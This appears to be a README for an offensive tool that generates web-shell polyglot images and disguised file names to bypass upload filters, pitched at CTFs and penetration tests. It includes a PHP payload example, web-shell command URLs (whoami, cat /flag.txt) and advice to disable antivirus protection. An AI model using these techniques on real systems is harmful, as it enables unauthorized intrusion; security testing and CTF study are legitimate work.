---

# 🔥 File Bypass Generator - Black Hat Edition 🔥

A powerful and modular Python tool designed to generate malicious image files for bypassing weak file upload restrictions in CTF challenges and penetration tests. This tool automates the creation of polyglot files and obfuscated filenames to exploit common vulnerabilities.

**Author:** CodeAx1
**For:** Educational Purposes & CTF Competitions

---

## ⚠️ DISCLAIMER & WARNING

**THIS TOOL IS STRICTLY FOR LEGAL AND EDUCATIONAL PURPOSES ONLY.**

*   Use only on systems you own **OR** have explicit, written permission to test.
*   Use only in controlled environments like **CTF competitions** or **your own lab**.
*   Unauthorized access to computer systems is a serious crime.

### 🦠 **ANTIVIRUS DETECTION NOTICE** 🦠

**This tool generates files containing malicious code signatures.**
> **I am not responsible if your antivirus software has a panic attack and deletes your files or your entire computer. This is expected behavior.**

The generated files are **designed to bypass security filters**, which means they often contain patterns that trigger **Antivirus (AV) and EDR solutions**. If you want to use this tool effectively, you should:

1.  **Disable real-time protection temporarily** while generating and testing payloads.
2.  Add the `bypass_payloads/` folder to your AV's exclusion list.
3.  Use a dedicated, isolated virtual machine (VM) for penetration testing (highly recommended).

---

## 🛠️ Installation & Setup

1.  **Clone the Repository:**
    ```bash
    git clone our file
    cd Advance-file-upload-bypasser
    ```

    *Required libraries: `PyYAML`, `Pillow`*

---

## 🚀 How to Use

### Basic Usage
Generate a single file by selecting a technique from the list:
```bash
python file_bypasser.py --ratio 1:1
```

### Advanced Usage
Generate ALL bypass techniques at once (Batch Mode):
```bash
python file_bypasser.py --ratio 16:9 --scale 50 --batch
```

### Command Line Arguments
| Argument | Description | Example |
| :--- | :--- | :--- |
| `--ratio` | **Required.** Image aspect ratio (Width:Height). | `--ratio 1:1` |
| `--scale` | Multiplier for the ratio to get final size in pixels. | `--scale 100` (creates 100x100px for 1:1) |
| `--yaml` | Path to your custom YAML patterns file. | `--yaml my_patterns.yaml` |
| `--name` | Base name for the generated file. | `--name my_shell` |
| `--payload` | Custom PHP payload to inject. | `--payload "<?php phpinfo(); ?>"` |
| `--batch` | Generate all patterns without prompting. | `--batch` |

---

## 📁 Understanding the YAML Pattern File

The tool uses `extension.yaml` to define the bypass techniques. You can easily add your own!

```yaml
- name: descriptive_name
  pattern: "filename.extension"
  access: "Instructions on how to access the shell after upload."
```

### Example Pattern:
```yaml
- name: double_extension
  pattern: "{basename}.php.jpg"
  access: "http://target.com/uploads/{filename}?cmd=whoami"
```
*   `{basename}` is replaced with the value from `--name`.
*   `{filename}` is replaced with the final generated filename.

---

## 🎯 How to Win CTFs with This Tool

1.  **Find a file upload form** on the target web application.
2.  **Run the tool** to create your arsenal of malicious files:
    ```bash
    python file_bypasser.py --ratio 1:1 --batch
    ```
    ```bash
    python3 advance_bypass.py --ratio 1:1 --type aspx --payload "CUSTOM_ASPAYLOAD"
    ```
3.  **Upload the files.** Use Burp Suite Intruder to automate uploading everything in the `bypass_payloads/` folder.
4.  **Find your shell!** The tool will print access URLs for you. One of them will work.
5.  **Execute commands & capture the flag:**
    ```bash
    # Example:
    http://ctf-target.com/uploads/shell.php.jpg?cmd=cat /flag.txt
    ```

---

## 🧠 Contribute & Customize

Feel free to contribute new bypass techniques by adding them to the `extension.yaml` file! The more patterns, the better the tool.

---

## 📜 License

This project is licensed under the MIT License - see the LICENSE file for details. Use this tool responsibly and ethically.

**Remember: With great power comes great responsibility. Now go win those CTFs!** 🏴‍☠️

---
